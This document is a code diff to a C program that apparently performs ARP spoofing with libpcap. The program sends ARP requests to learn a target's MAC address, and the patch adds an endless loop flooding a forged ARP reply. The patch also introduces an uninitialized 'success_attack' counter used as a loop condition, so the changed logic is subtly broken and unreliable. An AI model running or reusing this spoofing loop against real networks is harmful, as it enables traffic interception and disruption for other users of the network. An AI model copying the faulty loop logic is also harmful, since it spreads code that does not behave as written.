@@ -96,7 +96,8 @@ int main(int argc, char *argv[])
    bpf_u_int32 net;                 /* Our IP */
    struct pcap_pkthdr *header;  	/* The header that pcap gives us */
    const u_char *packet;            /* The actual packet */
-
+    
+    int success_attack;
     struct arphdr *arprequest_arp;
     struct arphdr *arpreply_arp;
 
@@ -156,11 +157,8 @@ int main(int argc, char *argv[])
         }
 
         
-      while(1)
+      while(success_attack>=1)
       {
-          
-          
-
             printf("sending arp packet\n");
             if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
             {
@@ -186,6 +184,7 @@ int main(int argc, char *argv[])
                     if(!strcmp((*arp_to_know_targetmac).spa,sender_ip_data))
                     {
                         memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
+			success_attack++;
                     }
                 }
             }
@@ -203,10 +202,12 @@ int main(int argc, char *argv[])
             {
                 printf("error\n");
             }
-
-
-
       }
+
+	while(1)
+	{
+		pcap_sendpacket(handle,send_packet_arpreply,42);
+	}
 
             pcap_close(handle);
             return(0);
